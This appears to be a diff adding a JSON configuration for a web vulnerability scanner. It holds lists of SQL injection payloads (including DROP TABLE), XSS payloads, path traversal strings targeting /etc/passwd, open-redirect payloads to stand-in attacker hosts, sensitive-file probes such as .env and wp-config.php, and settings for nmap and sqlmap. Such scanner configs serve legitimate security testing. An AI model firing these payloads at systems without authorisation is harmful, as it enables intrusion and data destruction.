@@ -1,0 +1,184 @@
+{
+    "scanner": {
+        "default_timeout": 10,
+        "max_retries": 3,
+        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "threads": 10,
+        "verbose": false
+    },
+    "vulnerabilities": {
+        "sql_injection": {
+            "enabled": true,
+            "payloads": [
+                "' OR '1'='1",
+                "' UNION SELECT NULL--",
+                "'; DROP TABLE users--",
+                "' OR 1=1#",
+                "admin'--",
+                "' OR 'x'='x",
+                "' UNION SELECT 1,2,3--",
+                "'; WAITFOR DELAY '00:00:05'--"
+            ],
+            "parameters": ["id", "user", "search", "q", "query", "page", "category"]
+        },
+        "xss": {
+            "enabled": true,
+            "payloads": [
+                "<script>alert('XSS')</script>",
+                "<img src=x onerror=alert('XSS')>",
+                "javascript:alert('XSS')",
+                "<svg onload=alert('XSS')>",
+                "'><script>alert('XSS')</script>",
+                "<iframe src=javascript:alert('XSS')>",
+                "<body onload=alert('XSS')>",
+                "<input onfocus=alert('XSS') autofocus>"
+            ],
+            "parameters": ["search", "q", "query", "id", "name", "comment", "message"]
+        },
+        "directory_traversal": {
+            "enabled": true,
+            "payloads": [
+                "../../../etc/passwd",
+                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+                "....//....//....//etc/passwd",
+                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+                "..%252f..%252f..%252fetc%2fpasswd",
+                "..%c0%af..%c0%af..%c0%afetc/passwd",
+                "..%255c..%255c..%255cwindows%255csystem32%255cdrivers%255cetc%255chosts"
+            ]
+        },
+        "open_redirect": {
+            "enabled": true,
+            "payloads": [
+                "https://evil.com",
+                "//evil.com",
+                "javascript:alert('redirect')",
+                "data:text/html,<script>alert('redirect')</script>",
+                "https://attacker.com",
+                "http://malicious-site.com"
+            ],
+            "parameters": ["redirect", "url", "next", "target", "redir", "return_url", "callback"]
+        }
+    },
+    "scanning": {
+        "common_files": [
+            "/.git/config",
+            "/.env",
+            "/config.php",
+            "/wp-config.php",
+            "/phpinfo.php",
+            "/test.php",
+            "/admin.php",
+            "/backup.sql",
+            "/.htaccess",
+            "/web.config",
+            "/robots.txt",
+            "/sitemap.xml",
+            "/.well-known/security.txt",
+            "/crossdomain.xml",
+            "/clientaccesspolicy.xml"
+        ],
+        "common_directories": [
+            "/admin",
+            "/administrator",
+            "/backup",
+            "/config",
+            "/database",
+            "/db",
+            "/dev",
+            "/files",
+            "/images",
+            "/img",
+            "/includes",
+            "/js",
+            "/lib",
+            "/library",
+            "/logs",
+            "/media",
+            "/modules",
+            "/plugins",
+            "/scripts",
+            "/src",
+            "/static",
+            "/temp",
+            "/test",
+            "/tmp",
+            "/uploads",
+            "/vendor",
+            "/wp-admin",
+            "/wp-content",
+            "/wp-includes"
+        ],
+        "subdomains": [
+            "www", "mail", "ftp", "admin", "blog", "dev", "test", "staging",
+            "api", "cdn", "static", "img", "images", "media", "files",
+            "support", "help", "docs", "wiki", "forum", "shop", "store",
+            "app", "mobile", "m", "secure", "login", "auth", "dashboard",
+            "panel", "cpanel", "webmail", "ns1", "ns2", "dns", "mx"
+        ]
+    },
+    "reporting": {
+        "output_format": "json",
+        "include_evidence": true,
+        "save_screenshots": false,
+        "generate_html_report": true,
+        "email_notifications": false,
+        "email_settings": {
+            "smtp_server": "",
+            "smtp_port": 587,
+            "username": "",
+            "password": "",
+            "from_email": "",
+            "to_email": ""
+        }
+    },
+    "security": {
+        "rate_limiting": {
+            "enabled": true,
+            "requests_per_second": 5,
+            "delay_between_requests": 0.2
+        },
+        "proxy": {
+            "enabled": false,
+            "http_proxy": "",
+            "https_proxy": "",
+            "username": "",
+            "password": ""
+        },
+        "ssl_verification": true,
+        "follow_redirects": true,
+        "max_redirects": 5
+    },
+    "external_tools": {
+        "nmap": {
+            "enabled": true,
+            "ports": "21,22,23,25,53,80,110,111,135,139,143,443,993,995,1723,3306,3389,5900,8080",
+            "scan_type": "-sS",
+            "service_detection": true,
+            "os_detection": true
+        },
+        "dirb": {
+            "enabled": true,
+            "wordlist": "/usr/share/dirb/wordlists/common.txt",
+            "extensions": [".php", ".asp", ".aspx", ".jsp", ".html", ".htm"]
+        },
+        "nikto": {
+            "enabled": true,
+            "host": "",
+            "port": 80,
+            "ssl": false
+        },
+        "sqlmap": {
+            "enabled": true,
+            "level": 1,
+            "risk": 1,
+            "batch": true,
+            "random_agent": true
+        },
+        "nuclei": {
+            "enabled": true,
+            "severity": ["critical", "high", "medium", "low"],
+            "templates": "all"
+        }
+    }
+} 
